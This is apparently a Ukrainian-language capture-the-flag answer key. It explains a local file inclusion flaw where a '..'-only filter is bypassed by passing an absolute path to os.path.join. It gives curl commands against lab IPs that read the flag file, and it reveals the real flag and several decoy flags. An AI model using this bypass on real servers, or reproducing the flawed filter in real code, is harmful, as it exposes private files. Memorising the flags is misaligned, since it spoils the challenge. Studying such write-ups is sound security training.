# 10. LFI to RCE (300 балів) — розв'язок

Прапор: `CTF{lf1_t0_rc3_p01s0n1ng_pr0}`

## Вразливість

Параметр `file` передається в `os.path.join('/app/files', file)`, а фільтр перевіряє
лише підрядок `..`:

```python
if '..' in file:
    return view("Hacking Attempt Detected!")
target = os.path.join('/app/files', file)
return view(open(target, 'r').read())
```

`os.path.join` відкидає базовий каталог, якщо другий аргумент — абсолютний шлях.
Тому `..` не потрібен: достатньо передати абсолютний шлях до файлу з прапором.

Спершу відкрийте `ops_note.txt` (є кнопка на головній сторінці). У ньому
вказано актуальний шлях сховища після ротації:

```text
Current vault path: /var/lib/titan/secure/.flag
```

## Експлойт

```bash
curl 'http://10.10.15.124:8010/?file=/var/lib/titan/secure/.flag'
```

Через VPN:

```bash
curl 'http://172.28.0.20:5000/?file=/var/lib/titan/secure/.flag'
```

У відповіді буде:

```text
CTF{lf1_t0_rc3_p01s0n1ng_pr0}
```

## Пастки

Старі шляхи залишили як приманки — усі вони містять фальшиві прапори:

- `/etc/secret_flag_1337.txt` → `CTF{lf1_l3g4cy_p4th_r0t4t3d}`;
- `/app/files/flag.txt` → `CTF{lf1_b4ckup_m1rr0r_fl4g}`;
- `/app/files/backup/flag.bak` → `CTF{lf1_b4ckup_d1r3ct0ry_fl4g}`.

Якщо бачите `l3g4cy`/`b4ckup` — це глухий кут. Справжній прапор лише за
шляхом із `ops_note.txt`.

## Прапор

```text
CTF{lf1_t0_rc3_p01s0n1ng_pr0}
```
